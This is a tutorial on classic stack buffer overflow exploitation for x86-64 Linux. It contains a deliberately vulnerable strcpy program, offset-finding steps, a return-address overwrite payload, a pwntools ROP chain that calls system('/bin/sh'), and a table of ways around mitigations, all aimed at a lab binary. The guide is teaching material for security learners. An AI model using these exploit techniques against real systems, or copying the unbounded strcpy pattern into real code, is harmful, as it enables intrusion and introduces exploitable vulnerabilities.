---
title: "Smashing the Stack in 2025"
author: "Sarah Chen"
handle: "stacksmash3r"
date: 2025-06-15
volume: 1
order: 1
category: guide
tags: [exploitation, buffer-overflow, x86, linux]
description: "A modern guide to buffer overflow exploitation - from stack basics to shellcode."
draft: false
---

# Smashing the Stack in 2025

Three decades after Aleph One's seminal article, buffer overflows remain one of the most fundamental classes of software vulnerability. While modern mitigations have raised the bar significantly, understanding the basics is essential for any security researcher.

## The Stack: A Quick Refresher

When a function is called on x86-64 Linux, the stack frame looks roughly like this:

```
┌──────────────────────┐  High addresses
│    Function args      │
│    (if > 6 args)      │
├──────────────────────┤
│    Return address     │  ← saved RIP
├──────────────────────┤
│    Saved RBP          │  ← frame pointer
├──────────────────────┤
│    Local variables    │  ← buffer lives here
│    (grows downward)   │
└──────────────────────┘  Low addresses
```

The key insight: local buffers grow *toward* the return address. If we can write past the end of a buffer, we overwrite the return address.

## A Vulnerable Program

Consider this classic example:

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("You said: %s\n", buffer);
}

int secret() {
    printf("[*] You've reached the secret function!\n");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
```

> [!WARN] Compile with protections disabled for learning purposes only: `gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c`

## Finding the Offset

We need to determine exactly how many bytes it takes to reach the return address. The classic approach uses a pattern:

```bash
# Generate a cyclic pattern
python3 -c "print('A' * 64 + 'B' * 8 + 'C' * 8)"

# Or use pwntools
python3 -c "from pwn import *; print(cyclic(100).decode())"
```

In GDB, we can see the crash:

```
(gdb) run $(python3 -c "print('A'*72 + 'BBBBBBBB')")
Program received signal SIGSEGV
0x4242424242424242 in ?? ()
```

> [!HACK] The offset to RIP is **72 bytes** (64 for buffer + 8 for saved RBP).

## Redirecting Execution

Now we overwrite the return address with the address of `secret()`:

```python
import struct

offset = 72
target = 0x401156  # address of secret() -- check with objdump

payload = b'A' * offset
payload += struct.pack('<Q', target)

print(payload.decode('latin-1'))
```

```bash
$ ./vuln $(python3 exploit.py)
You said: AAAAAAAAAA...
[*] You've reached the secret function!
```

## Modern Mitigations

In the real world, you'll face several defenses:

| Mitigation | Purpose | Bypass Technique |
|-----------|---------|-----------------|
| **Stack Canaries** | Detect buffer overflows | Leak canary value, brute force |
| **NX/DEP** | Non-executable stack | ROP chains, ret2libc |
| **ASLR** | Randomize memory layout | Info leak, partial overwrite |
| **PIE** | Position-independent executable | Info leak + relative addressing |
| **RELRO** | Read-only GOT | Target other writable areas |

### ROP: The Modern Approach

With NX enabled, we can't execute shellcode on the stack. Instead, we chain together existing code snippets ("gadgets"):

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
bin_sh = next(elf.search(b'/bin/sh'))

# Build chain: system("/bin/sh")
payload = b'A' * 72
payload += p64(ret)        # stack alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(elf.symbols['system'])
```

## Further Reading

* Aleph One, "Smashing the Stack for Fun and Profit" (Phrack 49)
* The Shellcoder's Handbook (2nd Edition)
* ROP Emporium -- Practice challenges for return-oriented programming
* LiveOverflow YouTube channel -- Excellent binary exploitation tutorials

---

> [!INFO] This article covers x86-64 Linux. ARM and Windows exploitation differ significantly but share the same fundamental concepts.

*Happy hacking -- but only on systems you own.*
